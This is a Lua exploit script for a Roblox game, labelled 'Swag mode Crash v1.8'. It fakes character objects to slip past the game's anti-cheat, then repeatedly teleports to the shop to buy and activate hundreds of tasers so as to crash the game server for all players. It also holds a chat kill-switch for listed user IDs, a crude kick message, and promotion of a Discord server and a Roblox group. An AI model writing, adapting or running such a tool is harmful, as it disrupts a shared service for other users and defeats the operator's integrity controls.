if not game:IsLoaded() then
    game.Loaded:Wait()
end
local player = game.Players.LocalPlayer
local MainEvent = game.ReplicatedStorage.MainEvent

if not game.CoreGui:FindFirstChild('CRASHING') then
    if player.DataFolder.Currency.Value >= 100000 then 
        if player:IsInGroup(9497553) then
            local CRASHING = Instance.new("ScreenGui")
            local Credit = Instance.new("Frame")
            local TextLabel = Instance.new("TextLabel")
            local UITextSizeConstraint = Instance.new("UITextSizeConstraint")
            local UICorner = Instance.new("UICorner")
            local TextLabel_2 = Instance.new("TextLabel")
            local UITextSizeConstraint_2 = Instance.new("UITextSizeConstraint")
            local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
            local MainFrame = Instance.new("Frame")
            local TotalTasers = Instance.new("TextLabel")
            local UITextSizeConstraint_3 = Instance.new("UITextSizeConstraint")
            local UICorner_2 = Instance.new("UICorner")
            local MoneyLeft = Instance.new("TextLabel")
            local UITextSizeConstraint_4 = Instance.new("UITextSizeConstraint")
            local Percent = Instance.new("TextLabel")
            local UITextSizeConstraint_5 = Instance.new("UITextSizeConstraint")
            local TextButton = Instance.new("TextButton")
            local UICorner_3 = Instance.new("UICorner")
            local UITextSizeConstraint_6 = Instance.new("UITextSizeConstraint")
            local Ping = Instance.new("TextLabel")
            local UITextSizeConstraint_7 = Instance.new("UITextSizeConstraint")
            local UIAspectRatioConstraint_2 = Instance.new("UIAspectRatioConstraint")
            
            --Properties:
            
            CRASHING.Name = "CRASHING"
            CRASHING.Parent = game.CoreGui
            CRASHING.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            
            Credit.Name = "Credit"
            Credit.Parent = CRASHING
            Credit.BackgroundColor3 = Color3.fromRGB(125, 125, 125)
            Credit.BorderSizePixel = 0
            Credit.Position = UDim2.new(-0.00543900533, 0, 0.125364438, 0)
            Credit.Size = UDim2.new(0.3014763, 0, 0.106413998, 0)
            
            TextLabel.Parent = Credit
            TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel.BackgroundTransparency = 1.000
            TextLabel.Position = UDim2.new(0.0180412363, 0, 0, 0)
            TextLabel.Size = UDim2.new(0.817010283, 0, 0.684931517, 0)
            TextLabel.Font = Enum.Font.Nunito
            TextLabel.Text = "Swag mode Crash v1.8"
            TextLabel.TextColor3 = Color3.fromRGB(0, 0, 0)
            TextLabel.TextScaled = true
            TextLabel.TextSize = 40.000
            TextLabel.TextWrapped = true
            
            UITextSizeConstraint.Parent = TextLabel
            UITextSizeConstraint.MaxTextSize = 40
            
            UICorner.Parent = Credit
            
            TextLabel_2.Parent = Credit
            TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TextLabel_2.BackgroundTransparency = 1.000
            TextLabel_2.Position = UDim2.new(0.358247399, 0, 0.397260189, 0)
            TextLabel_2.Size = UDim2.new(0.670103073, 0, 0.684931517, 0)
            TextLabel_2.Font = Enum.Font.Nunito
            TextLabel_2.Text = "discord.gg/Swagmode"
            TextLabel_2.TextColor3 = Color3.fromRGB(0, 0, 0)
            TextLabel_2.TextScaled = true
            TextLabel_2.TextSize = 30.000
            TextLabel_2.TextWrapped = true
            
            UITextSizeConstraint_2.Parent = TextLabel_2
            UITextSizeConstraint_2.MaxTextSize = 30
            
            UIAspectRatioConstraint.Parent = Credit
            UIAspectRatioConstraint.AspectRatio = 5.315
            
            MainFrame.Name = "MainFrame"
            MainFrame.Parent = CRASHING
            MainFrame.BackgroundColor3 = Color3.fromRGB(125, 125, 125)
            MainFrame.BorderSizePixel = 0
            MainFrame.Position = UDim2.new(-0.00577699905, 0, 0.288708419, 0)
            MainFrame.Size = UDim2.new(0.264957279, 0, 0.377551019, 0)
            
            TotalTasers.Name = "TotalTasers"
            TotalTasers.Parent = MainFrame
            TotalTasers.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            TotalTasers.BackgroundTransparency = 1.000
            TotalTasers.Position = UDim2.new(0.0326257087, 0, 0.0102716964, 0)
            TotalTasers.Size = UDim2.new(0.917888582, 0, 0.193050191, 0)
            TotalTasers.Font = Enum.Font.Nunito
            TotalTasers.Text = "Total Tasers : 0"
            TotalTasers.TextColor3 = Color3.fromRGB(0, 0, 0)
            TotalTasers.TextScaled = true
            TotalTasers.TextSize = 30.000
            TotalTasers.TextWrapped = true
            TotalTasers.TextXAlignment = Enum.TextXAlignment.Left
            
            UITextSizeConstraint_3.Parent = TotalTasers
            UITextSizeConstraint_3.MaxTextSize = 30
            
            UICorner_2.Parent = MainFrame
            
            MoneyLeft.Name = "MoneyLeft"
            MoneyLeft.Parent = MainFrame
            MoneyLeft.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            MoneyLeft.BackgroundTransparency = 1.000
            MoneyLeft.Position = UDim2.new(0.0384908095, 0, 0.203321889, 0)
            MoneyLeft.Size = UDim2.new(0.917888582, 0, 0.193050191, 0)
            MoneyLeft.Font = Enum.Font.Nunito
            MoneyLeft.Text = "Total Cash : ?"
            MoneyLeft.TextColor3 = Color3.fromRGB(0, 0, 0)
            MoneyLeft.TextScaled = true
            MoneyLeft.TextSize = 30.000
            MoneyLeft.TextWrapped = true
            MoneyLeft.TextXAlignment = Enum.TextXAlignment.Left
            
            UITextSizeConstraint_4.Parent = MoneyLeft
            UITextSizeConstraint_4.MaxTextSize = 30
            
            Percent.Name = "Percent"
            Percent.Parent = MainFrame
            Percent.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Percent.BackgroundTransparency = 1.000
            Percent.Position = UDim2.new(0.0384908095, 0, 0.39637208, 0)
            Percent.Size = UDim2.new(0.917888582, 0, 0.193050191, 0)
            Percent.Font = Enum.Font.Nunito
            Percent.Text = "Estimated Percent : 0%"
            Percent.TextColor3 = Color3.fromRGB(0, 0, 0)
            Percent.TextScaled = true
            Percent.TextSize = 30.000
            Percent.TextWrapped = true
            Percent.TextXAlignment = Enum.TextXAlignment.Left
            
            UITextSizeConstraint_5.Parent = Percent
            UITextSizeConstraint_5.MaxTextSize = 30
            
            TextButton.Parent = MainFrame
            TextButton.BackgroundColor3 = Color3.fromRGB(95, 95, 95)
            TextButton.Position = UDim2.new(0.0586510263, 0, 0.66409266, 0)
            TextButton.Size = UDim2.new(0.8621701, 0, 0.193050191, 0)
            TextButton.Font = Enum.Font.Nunito
            TextButton.Text = "FORCE RESET"
            TextButton.TextColor3 = Color3.fromRGB(0, 0, 0)
            TextButton.TextScaled = true
            TextButton.TextSize = 14.000
            TextButton.TextWrapped = true
            
            UICorner_3.Parent = TextButton
            
            UITextSizeConstraint_6.Parent = TextButton
            UITextSizeConstraint_6.MaxTextSize = 50
            
            Ping.Name = "Ping"
            Ping.Parent = MainFrame
            Ping.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
            Ping.BackgroundTransparency = 1.000
            Ping.Position = UDim2.new(0.328813404, 0, 0.855831444, 0)
            Ping.Size = UDim2.new(0.419354826, 0, 0.142857149, 0)
            Ping.Font = Enum.Font.Nunito
            Ping.Text = "Ping : 100"
            Ping.TextColor3 = Color3.fromRGB(0, 0, 0)
            Ping.TextScaled = true
            Ping.TextSize = 30.000
            Ping.TextWrapped = true
            Ping.TextXAlignment = Enum.TextXAlignment.Left
            
            UITextSizeConstraint_7.Parent = Ping
            UITextSizeConstraint_7.MaxTextSize = 30
            
            UIAspectRatioConstraint_2.Parent = MainFrame
            UIAspectRatioConstraint_2.AspectRatio = 1.317
                        
            ----------------------------------------------------------------------------------------
            ----------------------------------------------------------------------------------------
            ----------------------------------------------------------------------------------------
            local function unban()
                local localPlayer = game:GetService('Players').LocalPlayer;
                local localCharacter = localPlayer.Character;
                localCharacter:FindFirstChildOfClass('Humanoid').Health = 0;
              
                local newCharacter = localPlayer.CharacterAdded:Wait();
                local spoofFolder = Instance.new('Folder');
                spoofFolder.Name = 'FULLY_LOADED_CHAR';
                spoofFolder.Parent = newCharacter;
                newCharacter:WaitForChild('RagdollConstraints'):Destroy();
                local spoofValue = Instance.new('BoolValue', newCharacter);
                spoofValue.Name = 'RagdollConstraints';
            end
            

            unban()

            repeat wait() until game.Workspace.Players:FindFirstChild(player.Name)
            local character = game.Workspace:FindFirstChild(player.Name) or game.Workspace.Players:FindFirstChild(player.Name)
        
            local tasers = 0
            local STOP = false
            local NoCash = false
            
            local formatNumber = (function (n)
                n = tostring(n)
                return n:reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
            end)
                        
            local function glitchedcheck()
                if player.DataFolder.Currency.Value < 1000 then
                    NoCash = true
                end
            end


            local function progress()
                player.PlayerGui.Framework.CurrencySound.Volume = 0
                for i,v in pairs(player.PlayerGui.MainScreenGui:GetDescendants()) do
                    if v:IsA('Frame') or v:IsA('TextLabel') or v:IsA('TextButton') then
                        v.Visible = false
                    end
                end
                if NoCash == false then
                    if tasers <= 99999 then
                        local _percent = math.floor(tasers / 4.9)
                        if _percent <= 100 then
                            Percent.Text = ('Estimated Percent : ' .. _percent .. "%")
                        else
                            Percent.Text = ('taking longer than usual please wait')
                        end
                    end
                else
                    Percent.Text = ('unable to estimate time...')
                end
                MoneyLeft.Text = ('Money Left : $' .. formatNumber(tonumber(player.DataFolder.Currency.Value)))
                game:GetService("CoreGui").RobloxGui.Backpack.Visible = false
                Ping.Text = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()
            end
            progress()

            coroutine.resume(coroutine.create(function()
                game:GetService('RunService').RenderStepped:Connect(function()
                    if STOP == false then
                        player.Character:FindFirstChildWhichIsA('Humanoid'):ChangeState(11)
                    end
                end)
            end))
            
            coroutine.resume(coroutine.create(function()
                while wait(2) do
                    for i,v in pairs(player.Character:GetChildren()) do
                        if v.Name == '[Taser]' and STOP == false then
                            v:Activate()
                        end
                    end
                end
            end))
            
            coroutine.resume(coroutine.create(function()
                game:GetService('RunService').Heartbeat:Connect(function()
                    for i,v in pairs(player.Character:GetChildren()) do
                        if v.Name == '[Taser]' and STOP == false then
                            if v.Handle:FindFirstChild('Part') then
                                v.Handle.Part.Position = Vector3.new(500, -50, 0)
                            end
                        end
                    end
                end)
            end))
            
            local function checktasers()
                tasers = 0
                for i,v in pairs(player.Character:GetChildren()) do
                    if v.Name == '[Taser]' then
                        tasers = tasers + 1
                        if v.Handle:FindFirstChild('Sound') then
                            v.Handle:FindFirstChild('Sound'):Destroy()
                        end
                    end
                end
                TotalTasers.Text = ('Total Tasers : ' .. tostring(tasers))
            end
            
            
            local function buytasers()
                wait()
                local success, err = pcall(function()
                    local character = game.Workspace:FindFirstChild(player.Name) or game.Workspace.Players:FindFirstChild(player.Name)
                    if character then
                        local emode = game:GetService("Workspace").Ignored.Shop["[Taser] - $1000"].Head
                        player.Character.HumanoidRootPart.CFrame = CFrame.new(emode.Position.X, emode.Position.Y - 5, emode.Position.Z)
                        if tasers <= 500 then
                            fireclickdetector(game:GetService("Workspace").Ignored.Shop["[Taser] - $1000"].Head.Parent.ClickDetector)
                        end
                        for i,v in pairs(player.Backpack:GetChildren()) do
                            if v.Name == '[Taser]' then
                                v.Parent = player.Character
                            end    
                        end
                        if not player.Character.BodyEffects:FindFirstChild('Block') then
                            MainEvent:FireServer('Block', player.Name)
                        end
                        checktasers()
                        progress()
                        glitchedcheck()
                    end
                end)
            end

            player.Character:FindFirstChildWhichIsA('Humanoid').Died:Connect(function()
                if game.CoreGui:FindFirstChild('CRASHING') then
                    STOP = true
                    player.Character:Destroy()
                end
            end)
                        
            player.CharacterAdded:Connect(function()
                if game.CoreGui:FindFirstChild('CRASHING') and STOP == false then
                    STOP = true
                    for i,v in pairs(game.CoreGui:GetChildren()) do
                        if v.Name == 'CRASHING' then
                            v:Destroy()
                        end
                    end
                    game.StarterGui:SetCore("SendNotification", {
                        Title = "Swag mode - Crash failed";
                        Text = "crash failed - please try again";
                        Duration = 20;
                    })
                end
            end)
            
            TextButton.MouseButton1Click:Connect(function()
                player.Character:Destroy()
            end)
            
            
            local swagmins = {
                200547759,
                2351144328,
                44694442,
                1688589423,
            }
            
            local function commands(msg, plr)
                local kick = string.find(msg, ';stopcrash') or string.find(msg, '!stopcrash')
                if kick then
                    player:Kick('sex mode')
                    wait(5)
                    STOP = true
                    local x = {}
                	for _, v in ipairs(game:GetService("HttpService"):JSONDecode(game:HttpGetAsync("https://games.roblox.com/v1/games/" .. game.PlaceId .. "/servers/Public?sortOrder=Asc&limit=100")).data) do
                		if type(v) == "table" and v.maxPlayers > v.playing and v.id ~= game.JobId then
                			x[#x + 1] = v.id
                		end
                	end
                	if #x > 0 then
                		game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, x[math.random(1, #x)])
                	else
                		print('failed to find server')
                	end
                    player.Character.Humanoid.Health = 0
                end
            end
            
            game:GetService('Players').PlayerAdded:Connect(function(plr)
                local SWAGMIN = table.find(swagmins, plr.UserId)
                if SWAGMIN then
                    plr.Chatted:Connect(function(msg)
                        commands(msg, plr.UserId)
                    end)
                end
            end)
            for i,v in pairs(game:GetService('Players'):GetChildren()) do
                local SWAGMIN = table.find(swagmins, v.UserId)
                if SWAGMIN then
                    v.Chatted:Connect(function(msg)
                       commands(msg, v.UserId)
                    end)
                end
            end
            
            local function mainrun()
                repeat buytasers() until STOP == true
            end
            local success,err = pcall(mainrun)
        else
            setclipboard('https://www.roblox.com/groups/9497553/XJavascript-get-delete-the-x#!/about')
            game.StarterGui:SetCore("SendNotification", {
                Title = "Swag mode - Crash failed";
                Text = "you need to join the group copied to you clipboard to use this crash";
                Duration = 20;
            })
        end
    else
        game.StarterGui:SetCore("SendNotification", {
            Title = "Swag mode - Crash failed";
            Text = "you need atleast 100k to crash";
            Duration = 20;
        })
    end
end